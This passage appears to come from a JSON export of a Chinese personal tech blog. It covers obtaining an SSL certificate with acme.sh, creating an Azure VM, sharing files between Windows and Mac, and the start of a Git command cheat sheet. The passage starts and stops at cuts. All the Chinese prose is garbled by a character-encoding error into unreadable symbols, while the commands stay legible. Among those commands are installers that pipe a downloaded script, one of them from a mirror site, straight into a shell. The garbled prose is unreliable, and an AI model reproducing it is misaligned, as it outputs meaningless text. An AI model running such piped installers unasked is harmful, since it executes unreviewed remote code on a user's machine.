ï¸ï¼šä½¿ç”¨æ­¤æ–¹å¼è·å–çš„è¯ä¹¦ï¼Œæœ‰æ•ˆæœŸåªæœ‰ä¸‰ä¸ªæœˆã€‚ åè®°å› ä¸º FreeSSL.cn åé¢æ”¹ç‰ˆäº†ï¼Œä¹‹å‰æ˜¯ç›´æ¥ç”Ÿæˆå¯¹åº”çš„ *.key å’Œ *.pem æ–‡ä»¶ï¼Œç°åœ¨åˆ™å˜æˆäº† ACME è‡ªåŠ¨åŒ–ç”³è¯·ã€‚ å‰ä¸¤æ­¥è¿˜æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åˆ°äº†ç¬¬ä¸‰æ­¥ï¼Œä¸ä¸€æ ·ã€‚ ç°åœ¨éœ€è¦é€‰æ‹©ä¸€ç§éƒ¨ç½²æ–¹å¼ï¼Œæ¥è·å–è¯ä¹¦ï¼š Cerbot çš„éƒ¨ç½²æ–¹å¼å…¶ä»–ç¬”è®°å·²ç»æåˆ°äº†ï¼Œå› æ­¤è¿™é‡Œä»‹ç» acme.sh çš„æ–¹å¼ã€‚ é¦–å…ˆéœ€è¦å®‰è£… acme.shï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š 1curl https://get.acme.sh | sh -s email=my@example.com å¦‚æœä¸Šé¢å®˜æ–¹ä¸‹è½½åœ°å€å¤±è´¥ æˆ–è€… å¤ªæ…¢ï¼Œå¯ä»¥é€‰ç”¨å›½å†…çš„å¤‡ç”¨åœ°å€ï¼š 1curl https://gitcode.net/cert/cn-acme.sh/-/raw/master/install.sh?inline=false | sh -s email=my@example.com å®‰è£…å®Œæˆä¹‹åï¼Œå½“å‰ç›®å½•ä¸‹ä¼šå¤šå‡ºä¸€ä¸ª .acme.sh æ–‡ä»¶ï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶å¤¹ï¼š 123456789101112[root@localhost]$ ls -altotal 248drwx------ 8 ec2-user ec2-user 191 Feb 28 14:20 .drwx------ 7 ec2-user ec2-user 335 Feb 28 12:34 ..-rw-rw-r-- 1 ec2-user ec2-user 305 Feb 28 14:21 account.conf-rwxrwxr-x 1 ec2-user ec2-user 221245 Feb 28 12:29 acme.sh-rw-rw-r-- 1 ec2-user ec2-user 96 Feb 28 12:29 acme.sh.envdrwxrwxr-x 3 ec2-user ec2-user 29 Feb 28 12:34 cadrwxrwxr-x 2 ec2-user ec2-user 4096 Feb 28 12:29 deploydrwxrwxr-x 2 ec2-user ec2-user 4096 Feb 28 12:29 dnsapi-rw-rw-r-- 1 ec2-user ec2-user 460 Feb 28 14:21 http.headerdrwxrwxr-x 2 ec2-user ec2-user 4096 Feb 28 12:29 notify å…¶ä¸­ .acme.sh å°±æ˜¯ä¸€ä¼šéœ€è¦ç”¨åˆ°çš„ shell è„šæœ¬ã€‚ è·å–è¯ä¹¦ï¼š 1acme.sh --issue -d my@example.com --dns dns_dp --server https://acme.freessl.cn/v2/DV90/directory/z8s58p0gs74t0839d3mu å°†ç¤ºä¾‹å‘½ä»¤ä¸­çš„åŸŸåæ›¿æ¢æˆè‡ªå·±çš„åŸŸåå³å¯ã€‚ æ­£å¸¸æ‰§è¡Œå®Œæˆä¹‹åï¼Œå½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œä¼šå¤šå‡ºä¸€ä¸ªä»¥åŸŸåä¸ºåçš„æ–‡ä»¶ï¼š fullchain.cerï¼šè¯ä¹¦ï¼ˆåŸŸåè¯ä¹¦.crt + æ ¹è¯ä¹¦(root_bundle).crtï¼‰ my.example.com.keyï¼šå¯†é’¥ æœ‰äº†è¿™ä¸¤ä¸ªæ–‡ä»¶ä¹‹åï¼Œå°±å¯ä»¥è½»æ¾é…ç½® ssl äº†ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•åˆ›å»ºå¯åŠ¨ Azure å®ä¾‹","slug":"teach-you-how-to-create-and-start-an-azure-instance","date":"2020-08-12T15:49:19.000Z","updated":"2020-08-27T06:26:47.806Z","comments":true,"path":"teach-you-how-to-create-and-start-an-azure-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¦‚ä½•åˆ›å»ºå¯ç”¨ Azure å®ä¾‹ã€‚å› ä¸ºè¿™æ–¹é¢å¯ä»¥æ‰¾åˆ°çš„èµ„æ–™æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ã€‚ ä¸€æ˜¯æ–¹ä¾¿è‡ªå·±ä»¥åå›é¡¾ï¼ŒäºŒæ˜¯ç»™å…¶ä»–äººä½œä¸ºå‚è€ƒã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†å¦‚ä½•åˆ›å»ºå¯ç”¨ Azure å®ä¾‹ã€‚å› ä¸ºè¿™æ–¹é¢å¯ä»¥æ‰¾åˆ°çš„èµ„æ–™æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ã€‚ ä¸€æ˜¯æ–¹ä¾¿è‡ªå·±ä»¥åå›é¡¾ï¼ŒäºŒæ˜¯ç»™å…¶ä»–äººä½œä¸ºå‚è€ƒã€‚ å‡†å¤‡å› ä¸ºæœ¬æ–‡æ˜¯åˆ›å»ºå¾®è½¯äº‘ï¼Œæ‰€ä»¥é¦–å…ˆä½ å¾—æœ‰ä¸€ä¸ªå¾®è½¯è´¦å·ã€‚ æ‰“å¼€ Microsoft Azure è¿›è¡Œç™»å½•ï¼Œç™»å½•æˆåŠŸä¹‹åï¼Œè¿›å…¥äº‘æœåŠ¡ç®¡ç†åå°ã€‚ åˆ›å»ºå®ä¾‹ç‚¹å‡»åˆ›å»ºèµ„æºã€‚ å¯ä»¥æœç´¢ä½ æƒ³åˆ›å»ºçš„äº‘æœåŠ¡ç±»å‹ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ Ubuntu Server 18.04 LTSã€‚ ç‚¹å‡»åˆ›å»ºã€‚ æ”¾å¿ƒï¼Œè¿™é‡Œçš„åˆ›å»ºå¹¶ä¸æ˜¯æ­£çœŸæ„ä¹‰ä¸Šçš„åˆ›å»ºã€‚æ¥ä¸‹æ¥éœ€è¦ä¸ºæœºå™¨é¢„è®¾é…ç½®ã€‚ ä¸‹é¢å¯¹å¸¸è§çš„é…ç½®è¿›è¡Œç®€å•è¯´æ˜ï¼š èµ„æºç»„ï¼šç”¨æ¥åˆ†é…ä¸€äº›æƒé™ä»¥åŠç­–ç•¥ã€‚ è™šæ‹Ÿæœºåç§°ï¼šä½ å¸Œæœ›ç”¨ä»€ä¹ˆåç§°æ¥ç§°å‘¼è¿™å°æœºå™¨ï¼ˆé€šå¸¸æ˜¯è‹±æ–‡ï¼‰ åŒºåŸŸï¼šé€‰æ‹©æœºå™¨æ‰€åœ¨åœ°åŒº æ˜ åƒï¼šé€‰æ‹©æ“ä½œç³»ç»Ÿ å¤§å°ï¼šé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„è´Ÿè´£ç±»å‹ï¼Œå¯ä»¥ç†è§£æˆæœºå™¨çš„ç¡¬ä»¶é…ç½®ã€‚ èº«ä»½éªŒè¯ç±»å‹ï¼šé€šå¸¸æœ‰ä¸¤ç§ï¼šssh å¯†é’¥å’Œå¯†ç ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨å¯†é’¥è€Œä¸ä½¿ç”¨å¯†ç ï¼ˆå¯†å“¦å­˜åœ¨è¢«æš´åŠ›ç ´è§£çš„é£é™©ï¼‰ã€‚ ç”¨æˆ·åï¼šå¾®è½¯äº‘é»˜è®¤æ²¡æœ‰ç»™root ç”¨æˆ·ï¼Œè¿™é‡Œéœ€è¦æŒ‡å®šç”¨æˆ·åç§°ã€‚ å…¬å…±å…¥ç«™ç«¯å£ï¼šé€šå¸¸æ˜¯åªå¼€å¯HTTP (80)ã€HTTPS (443)ã€SSH (22) ã€‚ å®ŒæˆåŸºæœ¬é…ç½®ä¹‹åï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ï¼šç£ç›˜ã€‚ Azure é»˜è®¤åªæœ‰ä¸€ä¸ªç”¨äºçŸ­æœŸå­˜å‚¨çš„ä¸´æ—¶ç›˜ï¼Œè€Œä¸´æ—¶ç›˜é€šå¸¸éƒ½å¾ˆå°ã€‚ é»˜è®¤çš„ç£ç›˜å¾ˆå°ï¼Œå¦‚æœæƒ³æ‰©å¤§æœ‰ä¸¤ç§æ–¹å¼ï¼š åˆ›å»ºæ–°çš„ç£ç›˜ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‚è½½ã€‚ æ›´æ”¹é»˜è®¤ç£ç›˜çš„å¤§å°ã€‚ é…ç½®å®Œç£ç›˜ä¹‹åï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ï¼šç½‘ç»œã€‚ ç½‘ç»œé…ç½®ï¼Œå…¬ç”¨ip å¯ä»¥é€‰æ‹©æ— ï¼Œåé¢å†å»æ–°å»ºã€‚ ç„¶åç‚¹å‡»ä¸‹ä¸€æ­¥ï¼šç®¡ç†ã€‚ ç®¡ç†ã€é«˜çº§ã€æ ‡è®°è¿™ä¸€å—ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€æ±‚å¯ä»¥ç›´æ¥ä½¿ç”¨é»˜è®¤é…ç½®ã€‚ æœ€åç‚¹å‡»æŸ¥çœ‹+åˆ›å»ºï¼Œå¯ä»¥çœ‹åˆ°é¢„è®¾çš„é…ç½®ä¿¡æ¯ï¼Œå¦‚æœç¬¦åˆé¢„æœŸï¼Œç‚¹å‡»åˆ›å»ºã€‚ ä¸‹è½½ç§é’¥å¹¶ä¿å­˜å¥½ã€‚ æ­¤æ—¶ï¼Œè™½ç„¶å·²ç»åˆ›å»ºå¥½è™šæ‹Ÿæœºï¼Œä½†æ˜¯è¿˜ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå› ä¸ºæ²¡æœ‰é…ç½®IPã€‚ å…³è”IPAzure å’Œ AWS ä¸åŒï¼Œå®ƒå¹¶æ²¡æœ‰å¼¹æ€§IP çš„æ¦‚å¿µï¼Œå¦‚æœéœ€è¦é…ç½®IPï¼Œéœ€è¦åœ¨æœç´¢æ ä¸­æœç´¢å…¬å…±IPåœ°å€ï¼Œ ç‚¹å‡»ç¬¬ä¸€ä¸ªæœç´¢ç»“æœã€‚ ç‚¹å‡»æ·»åŠ ã€‚ é…ç½®IP åŸºæœ¬ä¿¡æ¯ï¼Œç„¶åç‚¹å‡»åˆ›å»ºã€‚ æ­¤æ—¶ï¼Œåªæ˜¯åˆ›å»ºäº†å†…ç½‘IPï¼Œå¹¶æ²¡æœ‰ä¸å¤–ç½‘IP åœ°å€è¿›è¡Œå…³è”ï¼Œ ç‚¹å‡»åˆšæ‰æ–°å»ºçš„å…¬å…± IP åœ°å€ï¼Œç‚¹å‡»é…ç½®ã€‚ èµ„æºç±»å‹é€‰æ‹©ç½‘ç»œæ¥å£ï¼Œç½‘ç»œæ¥å£ä¸å¯¹åº”çš„å®ä¾‹è¿›è¡Œå…³è”ã€‚ å…³è”æˆåŠŸä¹‹åï¼Œå°±å¯ä»¥è¿›è¡Œè¿æ¥äº†ã€‚ è¿æ¥ æ‰“å¼€ç»ˆç«¯ è¯·ç¡®ä¿ä½ å¯¹ç§é’¥å…·æœ‰åªè¯»è®¿é—®æƒé™ã€‚ 1chmod 400 &lt;ç§é’¥&gt; è¿è¡Œä»¥ä¸‹ç¤ºä¾‹å‘½ä»¤ä»¥è¿æ¥åˆ° VMã€‚ 1ssh -i &lt;ç§é’¥è·¯å¾„&gt; user@ip_address userï¼šè¡¨ç¤ºVM ç”¨æˆ· ip_addressï¼šè¡¨ç¤ºå¤–ç½‘IP åœ°å€ æ‰©å¤§é»˜è®¤ç£ç›˜å¤§å°ä¸Šé¢ç®€å•æåˆ°è¿‡ï¼Œå¦‚æœæƒ³è¦æ‰©å¤§é»˜è®¤ç£ç›˜çš„å¤§å°ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š æ·»åŠ æ–°ç£ç›˜ã€‚è¿™ç§æ–¹å¼éœ€è¦æ‰‹åŠ¨æŒ‚è½½ï¼Œå¦‚æœå¯¹linux å¹¶ä¸ç†Ÿæ‚‰ï¼Œè¿™ç§æ–¹å¼ä¸æ¨èæ–°æ‰‹ç”¨æˆ·ä½¿ç”¨ã€‚ æ›´æ”¹é»˜è®¤ç£ç›˜å¤§å°ã€‚ ç¬¬äºŒç§æ–¹å¼å¹¶ä¸èƒ½ç›´æ¥æ›´æ”¹ï¼Œéœ€è¦å…ˆå°†æœåŠ¡å™¨åœæ‰ï¼ˆæ³¨æ„âš ï¸ï¼šä¸æ˜¯åˆ é™¤ï¼‰ã€‚ æœç´¢ç£ç›˜ï¼Œç‚¹å‡»ç¬¬ä¸€ä¸ªæœç´¢ç»“æœã€‚ ç‚¹å‡»éœ€è¦æ‰©å¤§çš„ç£ç›˜å®ä¾‹ï¼Œæ³¨æ„ï¼šåªèƒ½æ‰©å¤§ï¼Œä¸èƒ½ç¼©å°ã€‚ ç„¶åç‚¹å‡»ä¿å­˜å³å¯ã€‚ æ€»ç»“è‡³æ­¤ï¼Œå°±å·²ç»å®Œæˆäº†Azure çš„åˆ›å»ºäº†ï¼Œè¿™æ–¹é¢éœ€è¦å­¦ä¹ çš„è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªæ˜¯ç®€å•çš„æ•´ç†äº†ä¸€ä¸‹è‡ªå·±é‡åˆ°çš„é—®é¢˜ã€‚ æœ‰äº›åœ°æ–¹å¯èƒ½æ²¡è¯´æ¸…æ¥šï¼Œä½†å¦‚æœèƒ½å¸®åˆ°ä½ é‚£çœŸæ˜¯å¤ªå¥½äº†","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"Windows å’Œ Mac åœ¨å±€åŸŸç½‘å†…å¦‚ä½•å…±äº«æ–‡ä»¶ï¼Ÿ","slug":"how-do-windows-and-mac-share-files-in-the-local-area-network","date":"2020-08-11T14:11:18.000Z","updated":"2020-08-13T11:43:07.419Z","comments":true,"path":"how-do-windows-and-mac-share-files-in-the-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/","excerpt":"æ¯å½“æ‰‹ä¸Šæœ‰ä¸¤å°æˆ–å¤šå°ç”µè„‘æ—¶ï¼Œå¦‚æœæƒ³ä¼ é€ä¸€ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯å¾®ä¿¡ã€QQç­‰è¿™ç±»å·¥å…·ã€‚å¦‚æœç¢°åˆ°äº†å¤§ä¸€ç‚¹çš„æ–‡ä»¶ï¼Œå°±å¾—æ¢æˆç½‘ç›˜æˆ–è€…ç§»åŠ¨ç¡¬ç›˜ã€‚ èº«ä¸ºä¸€ä¸ªåšå¼€å‘è€…ï¼Œè¿™ç§åšæ³•æ¯”è¾ƒlowï¼Œæ‰€ä»¥æ‰¾äº†å‡ ç¯‡æ–‡ç« å­¦ä¹ åˆ°äº†å¦‚ä½•åœ¨å±€åŸŸç½‘å†…å…±äº«æ–‡ä»¶ã€‚","text":"æ¯å½“æ‰‹ä¸Šæœ‰ä¸¤å°æˆ–å¤šå°ç”µè„‘æ—¶ï¼Œå¦‚æœæƒ³ä¼ é€ä¸€ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯å¾®ä¿¡ã€QQç­‰è¿™ç±»å·¥å…·ã€‚å¦‚æœç¢°åˆ°äº†å¤§ä¸€ç‚¹çš„æ–‡ä»¶ï¼Œå°±å¾—æ¢æˆç½‘ç›˜æˆ–è€…ç§»åŠ¨ç¡¬ç›˜ã€‚ èº«ä¸ºä¸€ä¸ªåšå¼€å‘è€…ï¼Œè¿™ç§åšæ³•æ¯”è¾ƒlowï¼Œæ‰€ä»¥æ‰¾äº†å‡ ç¯‡æ–‡ç« å­¦ä¹ åˆ°äº†å¦‚ä½•åœ¨å±€åŸŸç½‘å†…å…±äº«æ–‡ä»¶ã€‚ å‡†å¤‡è¿™é‡Œå‡†å¤‡çš„æ˜¯ç”¨ Windows ä½œä¸ºä¸»æœºåˆ›å»ºå…±äº«æ–‡ä»¶ã€‚ é¦–å…ˆè¦ç¡®è®¤å‡†å¤‡ä¼ è¾“æ–‡ä»¶çš„ Windows å’Œ Mac æ˜¯åœ¨åŒä¸€ä¸ªè·¯ç”±å™¨ç»„æˆçš„å±€åŸŸç½‘å†…ã€‚ ç„¶åæ‰“å¼€ Windows çš„æ–‡ä»¶èµ„æºç®¡ç†å™¨ï¼Œåœ¨å…¶æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼Œåç§°éšæ„ï¼Œè‡ªå·±çŸ¥é“å°±å¥½äº†ã€‚ å³é”®æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»å±æ€§ï¼Œæ‰¾åˆ° å…±äº« Tabï¼Œç‚¹å‡»é«˜çº§å…±äº«ã€‚ å‹¾é€‰å…±äº«æ­¤æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»ç¡®å®šã€‚ ç„¶åå›åˆ°å…±äº«æ–‡ä»¶å¤¹ï¼Œå³é”®ç‚¹å‡»å±æ€§ï¼Œæ‰¾åˆ°å…±äº«ï¼Œé€‰æ‹©ç”¨æˆ·ã€‚ å¦‚æœå…è®¸å…¶ä»–äººå†™å…¥ï¼Œåˆ™é€‰æ‹© Everyoneï¼Œæ›´æ”¹ä¸ºï¼šè¯»å–/å†™å…¥ã€‚ è®¿é—®Windows æœ¬æœºè®¿é—®123# ComputerName è¡¨ç¤ºï¼šä½ çš„è®¡ç®—æœºåç§°# ShareFolders è¡¨ç¤ºï¼šå…±äº«æ–‡ä»¶å¤¹åç§°file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F; Mac å±€åŸŸç½‘è®¿é—®Mac æœ‰ä¸¤ç§æ–¹å¼ï¼š é€šè¿‡æµè§ˆå™¨è®¿é—® é€šè¿‡è®¿è¾¾è®¿é—®ï¼Œä½¿ç”¨å¿«æ·é”® âŒ˜ + k123# ComputerName è¡¨ç¤ºï¼šéœ€è¦è®¿é—®çš„è®¡ç®—æœºåç§°# ShareFolders è¡¨ç¤ºï¼šå…±äº«æ–‡ä»¶å¤¹åç§°smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F; é€šè¿‡éªŒè¯ä¹‹åï¼Œå°±èƒ½è®¿é—®åˆ°å…±äº«æ–‡ä»¶å¤¹äº†ã€‚ åˆ°è¿™é‡Œåº”è¯¥å°±èƒ½é¡ºåˆ©çš„åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªç”µè„‘ä¹‹é—´ä¼ è¾“æ–‡ä»¶äº†ã€‚ å¦‚æœè¿˜ä¸èƒ½è®¿é—®ï¼Œå¯ä»¥ping ä¸€ä¸‹å¯¹æ–¹çš„ä¸»æœºï¼Œå¦‚æœæ²¡æœ‰pingé€šï¼Œæ£€æŸ¥ä¸€ä¸‹é˜²ç«å¢™è®¾ç½®ã€‚ å¦‚æœé˜²ç«å¢™å…³ç€ï¼Œé‚£ä¹ˆä¼š ping ä¸é€šã€‚ å‚è€ƒé“¾æ¥ Windows å’Œ Mac åœ¨å±€åŸŸç½‘å†…å¦‚ä½•å…±äº«æ–‡ä»¶ï¼Ÿ å…±äº«æ–‡ä»¶å¤¹ ä¸€ä¸ªå®ç°Windowså’ŒMacä¹‹é—´æ–‡ä»¶äº’ä¼ çš„ç®€å•æ–¹æ³•","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Git å¸¸ç”¨å‘½ä»¤å‚è€ƒæ‰‹å†Œ","slug":"git-common-command-reference-manual","date":"2020-08-11T01:22:19.000Z","updated":"2021-11-13T01:52:54.629Z","comments":true,"path":"git-common-command-reference-manual/","link":"","permalink":"https://www.0x2beace.com/git-common-command-reference-manual/","excerpt":"è™½ç„¶æ¯å¤©éƒ½åœ¨ä½¿ç”¨Gitï¼Œä½†æ˜¯æœ‰äº›å‘½ä»¤å¤ªä¹…ä¸ä½¿ç”¨ï¼Œè¿˜æ˜¯ä¼šå¿˜è®°ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯æ•´ç†é‚£äº›Git å¸¸ç”¨å‘½ä»¤ã€‚","text":"è™½ç„¶æ¯å¤©éƒ½åœ¨ä½¿ç”¨Gitï¼Œä½†æ˜¯æœ‰äº›å‘½ä»¤å¤ªä¹…ä¸ä½¿ç”¨ï¼Œè¿˜æ˜¯ä¼šå¿˜è®°ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯æ•´ç†é‚£äº›Git å¸¸ç”¨å‘½ä»¤ã€‚ åŸºç¡€é…ç½®Gitçš„è®¾ç½®æ–‡ä»¶ä¸º.gitconfigï¼Œå®ƒå¯ä»¥åœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹ï¼ˆå…¨å±€é…ç½®ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨é¡¹ç›®ç›®å½•ä¸‹ï¼ˆé¡¹ç›®é…ç½®ï¼‰ã€‚ 1234567891011121314151617181920# æŸ¥çœ‹å…¨å±€é…ç½®åˆ—è¡¨$ git config --global --list# æŸ¥çœ‹å±€éƒ¨é…ç½®åˆ—è¡¨$ git config --local --list# è®¾ç½®å…¨å±€ç”¨æˆ·å&#x2F;é‚®ç®±$ git config --global user.name &quot;yourName&quot;$ git config --global user.email &quot;example@example.com&quot;# è®¾ç½®æœ¬åœ°å½“å‰å·¥ä½œåŒºä»“åº“ç”¨æˆ·å&#x2F;é‚®ç®±$ git config --local user.name &quot;yourName&quot;$ git config --local user.email &quot;example@example.com&quot;# å°†é»˜è®¤æ–‡æœ¬ç¼–è¾‘å™¨è®¾ç½®ä¸º emacs&#x2F;vim$ git config --global core.editor emacs&#x2F;vim# ç¼–è¾‘å½“å‰ä»“åº“çš„é…ç½®æ–‡ä»¶$ git config -e # ç­‰ä»·ä¸ vim .git&#x2F;config# ç¼–è¾‘å…¨å±€é…ç½®æ–‡ä»¶$ git config --global -e å‘½ä»¤åˆ«åé…ç½®12345678# æ·»åŠ åˆ«å git st &#x3D; git status$ git config --global alias.st status# åˆ é™¤ st åˆ«å$ git config --global --unset alias.st# æ‰§è¡Œå¤–éƒ¨å‘½ä»¤, åªè¦åœ¨å‰é¢åŠ  ! å³å¯$ git config --global alias.st &#39;!echo hello&#39;; ä»£ç†é…ç½®å¦‚æœæƒ³çŸ¥é“å…³äºGité…ç½®ä»£ç†çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ 1234567891011# é…ç½®HTTP&#x2F;HTTPS ä»£ç†$ git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087# æŸ¥çœ‹$ git config --global --get http.proxy$ git config --global --get https.proxy# å–æ¶ˆä»£ç†$ git config --global --unset http.proxy$ git config --global --unset https.proxy ç”ŸæˆSSHKeyå…³äºå¦‚ä½•é…ç½®ssh config å¯ä»¥æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ 12345# å°†ssh keyç”Ÿæˆåœ¨é»˜è®¤ä¸‹ï¼Œä¹Ÿå°±æ˜¯&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;ã€‚$ ssh-keygen -t rsa -C &quot;youremail&quot;# å°†ssh keyç”Ÿæˆåœ¨æŒ‡å®šè·¯å¾„ä¸‹çš„æŒ‡å®šæ–‡ä»¶åä¸­$ ssh-keygen -t rsa -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot; å‡†å¤‡å·¥ä½œ1234567891011# åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªGitä»£ç åº“$ git init# æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå°†å…¶åˆå§‹åŒ–ä¸ºGitä»£ç åº“$ git init [project-name]# ä¸‹è½½ä¸€ä¸ªé¡¹ç›®å’Œå®ƒçš„æ•´ä¸ªä»£ç å†å²$ git clone [url] [project-name]# æµ…å…‹éš†, å†å²è®°å½•åªå…‹éš†æœ€åä¸€æ¡, å‡å°‘å…‹éš†æ—¶é—´$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git åŸºç¡€æ“ä½œåŸºç¡€æ“ä½œä¸­çš„å‘½ä»¤éƒ½æ˜¯æ—¥å¸¸ä½¿ç”¨é¢‘ç‡éå¸¸é«˜çš„ã€‚ æ–‡ä»¶çŠ¶æ€12345678# æŸ¥çœ‹å·¥ä½œåŒºçŠ¶æ€$ git status# åˆ—å‡ºæ²¡æœ‰è¢« .gitignore å¿½ç•¥çš„æ–‡ä»¶åˆ—è¡¨$ git status --ignored# åˆ—å‡ºæ²¡æœ‰è¢« .gitignore å¿½ç•¥çš„æ–‡ä»¶åˆ—è¡¨$ git ls-files æ–‡ä»¶æ“ä½œ1234567891011121314151617181920# æš‚å­˜æ‰€æœ‰$ git add -A# æš‚å­˜æŸä¸ªæ–‡ä»¶$ git add .&#x2F;README.md# æ·»åŠ å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº $ git add .# æš‚å­˜ä¸€ç³»åˆ—æ–‡ä»¶$ git add 1.txt 2.txt ...# ä»æš‚å­˜åŒºä¸­åˆ é™¤æ–‡ä»¶ï¼ˆgit add çš„åå‘æ“ä½œï¼‰$ git rm [file] # æš‚å­˜åŒºã€å·¥ä½œåŒºä¸€èµ·åˆ é™¤$ git rm -f [file]# åœæ­¢è¿½è¸ªæŒ‡å®šæ–‡ä»¶ï¼Œä½†è¯¥æ–‡ä»¶ä¼šä¿ç•™åœ¨å·¥ä½œåŒº$ git rm --cached [file] æŸ¥çœ‹æ–‡ä»¶æ”¹åŠ¨123456789101112131415# æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶æ”¹åŠ¨$ git diff# æŸ¥çœ‹å…·ä½“æ–‡ä»¶çš„æ”¹åŠ¨$ git diff README.md# æŸ¥çœ‹æŒ‡å®š commit-id æ”¹åŠ¨å†…å®¹$ git diff [commit-id]# å¯¹æ¯”å·¥ä½œåŒºå’Œç‰ˆæœ¬åº“é‡Œçš„æœ€æ–°ç‰ˆæœ¬æœ‰ä»€ä¹ˆåŒºåˆ«$ git diff HEAD --[file-name]# æŸ¥çœ‹æŸä¸ªæ–‡ä»¶çš„å†å²ä¿®æ”¹è®°å½•$ git log README.md$ git show [commit-id] README.md æ’¤é”€ä¸å›æ»š1234567891011121314151617# æ¢å¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°å·¥ä½œåŒº$ git checkout [file]# æ¢å¤æš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶åˆ°å·¥ä½œåŒº$ git checkout .# é‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¸ä¸Šä¸€æ¬¡commitä¿æŒä¸€è‡´$ git reset --hard# å›æ»šä¸Šä¸€ä¸ªç‰ˆæœ¬$ git reset --hard HEAD^# å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬ï¼ˆä¼šé‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼‰$ git reset --hard [commit-id]# å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬ï¼ˆä¸ä¼šé‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¼šå›åˆ°è¯¥ç‰ˆæœ¬çš„æš‚å­˜çŠ¶æ€ï¼‰$ git reset --soft [commit-id] æäº¤123456789101112# æäº¤æš‚å­˜åŒºåˆ°æœ¬åœ°ä»“åº“$ git commit -m [message]# æäº¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°æœ¬åœ°ä»“åº“git commit README.md -m [message]# 